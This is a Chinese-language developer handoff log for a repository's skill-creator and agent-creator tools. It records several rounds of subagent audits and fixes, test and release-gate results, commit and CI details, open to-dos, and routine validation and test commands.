- `.opencode/skills/skill-creator` 镜像同步 `SKILL.md`/`create_skill.py`/新 evolutions（源码哈希一致；`__pycache__` 除外）。
- 发布门全绿（见下）；**未提交 / 未推送**。

### Q. agent-creator 第四轮定向加严 0.7.3 → 0.7.4（本会话，3 项）

与 skill 第八轮同批，定向攻 HANDOFF 第 9 条待办。先运行期复核第三轮 5 项修复（全部生效），再逐条复现，修复 3 项：

1. **`create_agent.py` 模板替换用 f-string 当 `re.sub` 替换串 → 反斜杠/多行 description 产物非法（高，正确性/契约）**：`re.sub(pattern, f"description: {_yaml_str(desc)}", ...)` 的替换串会经 `re` 反斜杠转义处理。实证：description 含 `C:\Users\me`/`\d+` → JSON 转义的 `\\` 被折叠成 `\` → **非法 YAML**（`ScannerError`）；含换行 → JSON `\n` 变真实换行、YAML 折叠为空格，**内容静默丢失**。孪生 `create_skill.py` 早用 lambda，属孪生不对称。修复：`description`/`version`/`tools`/`mode` 四处统一 lambda。
2. **`create_agent.py` 缺 description 长度/非空白校验（中，契约）**：docstring 承诺产物可校验，但 >300 或纯空白 description 照写、立即被自己的验证器拒绝。修复：前置拒绝（对齐 `create_skill.py`）。
3. **`--out` 路径冲突未捕获 → 原始 traceback（中，健壮性/契约）**：`create_agent.py` 与 `adapt_agent.py` 在 `--out` 指向已存在目录、或路径父级是文件时抛未捕获 `OSError`。修复：目录检查 + 写入/建目录 `try/except OSError`（对齐 skill 侧已有处理）。
   - 附带（低，文档-行为一致）：`adapt_agent.py` passthrough 文档「byte-identical」与实际（去 BOM、换行翻译）不符，措辞收敛。

- 端到端误报回归：能力库 **32 代理 × 4 客户端**全部 adapt rc=0 且产物 YAML 可解析；最小脚手架（`--no-interactive` 仅 `--name`）过自身验证器。
- 测试：新增 `agent-creator/tests/test_hardening_round4.py` **6 例** → agent pytest **58 → 64**；`evolutions/2026-09-10-audit-round4.md`（新增）。
- 发布门全绿（见下）；**未提交 / 未推送**。

### R. 本会话收尾：五轮副agent循环审计 → 提交/推送（主agent调度）

主agent按用户要求启动副agent循环（副agent再自建 subagent / 或本机逐条实证），直至两成品达标：

- **调度链**：副#1 skill-creator 第五轮（0.9.19）→ 副#2 agent-creator 第一轮（0.7.1）→ 副#3 agent 第二轮复核 + skill 确认（0.7.2/0.9.20）→ 副#4 最终对抗式交叉验证（0.7.3/0.9.21）→ 副#5 定向加严轮（0.7.4/0.9.22）。授权语（开放所有 permission、无人值守）已逐级下达。
- **反复被推翻的「达标」**：每次子代理判定「无可复现缺陷」后，下一轮换角度用运行期探针都能推翻并发现真实缺陷（孪生不对称、安全续行/引号绕过、隐藏目录凭据盲区、验证器 fail-open、脚手架 YAML 转义等）。合计本会话修复 **skill 13 项 + agent 33 项**。
- **主agent独立复核（收尾时实跑全绿）**：agent pytest **64**、skill pytest **167**；agent 库 strict **32**；skill 成品 strict **1** / 能力库 strict **5**；索引 skill **4 源 2187** / agent **3 源 568**；`build_catalog.py --check` 两库 up to date。
- **两项设计边界（经用户确认「保持现状，仅文档记录」）**：① `validate_agents.py` 不传 `--dir` 时扫 0 个仍全绿（显式 `--dir` 已 fail-loud）；② `adapt_for_opencode` 同时给 `tools` 白名单与 `permission` 字符串简写时丢弃白名单、保留全局简写（放大权限，靠 note 提示）。**不属缺陷，勿擅自收严**（收严会改变验证器/适配器语义，需再次用户确认）。
- 已按铁律 3 收尾：发布门全绿 + 文档/evolutions/版本/CATALOG 同步 + 本 HANDOFF 更新为第 16 版，随后由主agent提交并推送。提交 **`232167c`**（`39195da..232167c`），CI 三 job 全绿（run 34550070079）。

## 已知待办 / 潜在风险

1. **真机基准已跑通（0.9.7，隔离版）**：工具侧 `--model`/`--timeout`/`--concurrency`/超时保信号/隔离全部就绪；14 查询 × 3 轮复跑 <5 分钟、零污染。当前成绩：正例 recall ≈ 0.625、precision 100%、0 假阳性。触发仍有非确定性（同句可能一次派发、一次直接作答）。**待办**：如需进一步提升 recall，方向是优化 description 或增加 runs——不属工具缺陷，勿擅自改描述。
2. **成品已修至 skill-creator 0.9.22 / agent-creator 0.7.4（第三/四/五/七/八轮 + 收尾复核）**：九轮后子代理曾判定「无可复现缺陷」，但独立审计三轮又找出 25 项真实缺陷并已修复，收尾复核再修 1 项（0.9.20），第七轮对抗式交叉验证再修 5 项（0.9.21），**第八/四轮定向加严再修 4 项**（skill 0.9.22 空白描述；agent 0.7.4 脚手架 YAML 转义/描述边界/`--out` 冲突）；**教训：①审计要覆盖「已提交产物的数据契约」与「文档承诺 ≠ 行为」，不能只盯异常输入 traceback；②修复后必须再复核「修是否真的生效」；③孪生两侧须逐一对照，安全逻辑一份实现的补丁不会自动出现在另一侧；④「已达标」必须换角度证伪；⑤用户内容拼进 `re.sub` 替换串必经 lambda（反斜杠/组引用会破坏 YAML 或内容）**。后续再改脚本仍按 SOP 补 pytest 并重跑发布门。已知残留（低，未改）：`examples/README.md` 称 `loki-mode/references/` 有 16 个子文件，实为 14——按用户「examples/ 不需修复」指示保留；`build_index.scan_skill_dir` 对扫描源 `source` 硬编码 `community`（需联网重建 DB 才能同步，留待线上重建）。
3. **触发评测为词重叠启发式**：仅代表词面覆盖，不代表真实触发率；`ue5-performance-optimization` 对「Unity 性能优化」的假阳性属固有（性能/优化为核心词不可去），不宜继续为此改描述。
4. **能力库/审计一致性**：`skills/` 现 5 技能、`agents/` 32 代理；增删须同步 `skills/SKILLS-AUDIT.md`/`agents/AGENTS-AUDIT.md` 与两份 `CATALOG.md`，重跑 `python tools/scripts/build_catalog.py`。（本会话只改创建器成品，未改技能/代理集合，审计与 CATALOG 无需变动。）
5. **触发代理追加的 5 个测试已保留**：`tests/test_hardening.py` 中 `test_run_cli_item_threshold_semantics` 等 5 例——经审阅内容正确、全绿，用户决定保留。
6. **已评估、用户明确「不需要修复」的项（勿再主动提出）**：skill-creator 成品 `examples/`（103 文件学习样本）、两份 `indexes/upstream.db`（随成品提交）、能力库 UE/academic 垂直内容——维持现状。
7. **提交纪律（铁律 3）**：任何 git 提交/推送前，必先跑发布门全绿 + 同步受影响的文档（README/审计/CATALOG/evolutions/版本号）+ 更新本 `HANDOFF.md` + 向用户输出可点击复制的新会话交接提示。（历史：`e819536`/`dfaf829` 已推送；**本会话全部改动已完成收尾并经用户确认提交/推送，见 §R**。）
8. **CI 已首次在真机运行并全绿**：`.github/workflows/validate.yml` 在推送 `dfaf829` 后运行，三个 job（agent-creator pytest+strict / skill-creator pytest+strict / CATALOG --check）全部 **success**（run 34480215967，https://github.com/losemymind/Personal-AI-Tools/actions/runs/34480215967 ）。
9. **总任务进展（全阶段，本会话已完成并提交/推送，见 §R）**：
   - **阶段一（skill-creator 独立审计）**：✅ 第五轮（0.9.18 → 0.9.19，6 项）+ 收尾复核（0.9.19 → 0.9.20，1 项）+ **第七轮对抗式交叉验证（0.9.20 → 0.9.21，5 项）** + **第八轮定向加严（0.9.21 → 0.9.22，1 项）** 均已完成，发布门全绿（skill pytest 167、成品+能力库 strict、索引 4 源 2187、CATALOG --check）。第八轮覆盖：运行期复核上轮 5 项生效 + 脚手架空白描述契约。
   - **阶段二（agent-creator 相同审计）**：✅ 第一轮（0.7.0 → 0.7.1，21 项 + 新 `security_scan.py`）+ 第二轮独立复核（0.7.1 → 0.7.2，6 项）+ **第三轮对抗式交叉验证（0.7.2 → 0.7.3，3+2 项）** + **第四轮定向加严（0.7.3 → 0.7.4，3 项）** 均已完成，发布门全绿（agent pytest 64、库 strict 32、索引 3 源 568、CATALOG --check）。第四轮覆盖：`create_agent` YAML 替换转义、描述长度/空白边界、`create_agent`/`adapt_agent` `--out` 路径冲突。
   - **判定（本会话加严轮）**：本轮共修复 **4 个不同缺陷**（agent 侧 3、skill 侧 1，其中空白描述 1 项为双孪生共享）；均先运行期实证复现、修复补 pytest、并对修复再复核（`create_agent` 反斜杠/多行往返、`--out` 干净错误、能力库 32×4 端到端零误报）。据此，两成品在**合理用户路径**上，本轮及此前发现的正确性/安全/契约/文档-行为缺陷均已修复并回归；**未再构造出新的可复现缺陷**（CJK+FTS 混合、脚手架非 ASCII/多行、四端 post-check 边界均已实证）。
   - **下一步（下个副 agent 的精确待办）**：本会话未发现剩余可复现缺陷；两项设计边界（`validate_agents.py --dir` 缺省扫 0、`adapt_for_opencode` 权限放大）**经用户确认保持现状、仅文档记录，不再主动收严**。若后续仍要加固，建议换全新角度（非必须）：客户端各自真实安装形态的端到端消费、`run_eval/run_scenario` 真机长跑稳定性、索引在线重建脚本。否则视为任务完成。
   - 全阶段达标后：按铁律 3 收尾（发布门全绿 + 同步文档 + 更新本 HANDOFF + 输出新会话交接提示）；本会话已由用户确认提交/推送。

## 验证命令备忘

```bash
# agent-creator（在 agent-creator/ 根）——发布门 = 一个 pytest 命令全含
python -m pytest tests/ -q        # 回归 + 成品自包含自检（64 例）
python skills/agent-creator/scripts/validate_agents.py --strict --dir E:\GitHub\Personal-AI-Tools\agents   # 库 strict（32）
python skills/agent-creator/scripts/search_agent_index.py --stats             # 3 源 568 条

# skill-creator（在 skill-creator/ 根）
python -m pytest tests/ -q                                                    # 167 例
python skills/skill-creator/scripts/validate_skills.py --strict --dir skills/skill-creator
python skills/skill-creator/scripts/validate_skills.py --strict --dir E:\GitHub\Personal-AI-Tools\skills
python skills/skill-creator/scripts/search_index.py --stats                   # 4 源 2187 条

# 能力库（仓库根）
python agent-creator/skills/agent-creator/scripts/validate_agents.py --strict --dir agents  # 32
python skill-creator/skills/skill-creator/scripts/validate_skills.py --strict --dir skills   # 5
python tools/scripts/build_catalog.py
python tools/scripts/build_catalog.py --check

# 真机触发评测（仓库根；单条查询 30–120s，务必并行 + 超时兜底；cli 模式自动隔离、结束清理临时工作区）
python skill-creator/skills/skill-creator/scripts/run_eval.py --eval-set skill-creator/skills/skill-creator/evals.json --skill-dir skill-creator/skills/skill-creator --mode cli --client opencode --model deepseek/deepseek-v4-flash --timeout 120 --runs-per-query 3 --concurrency 7 --output-dir <dir>
```
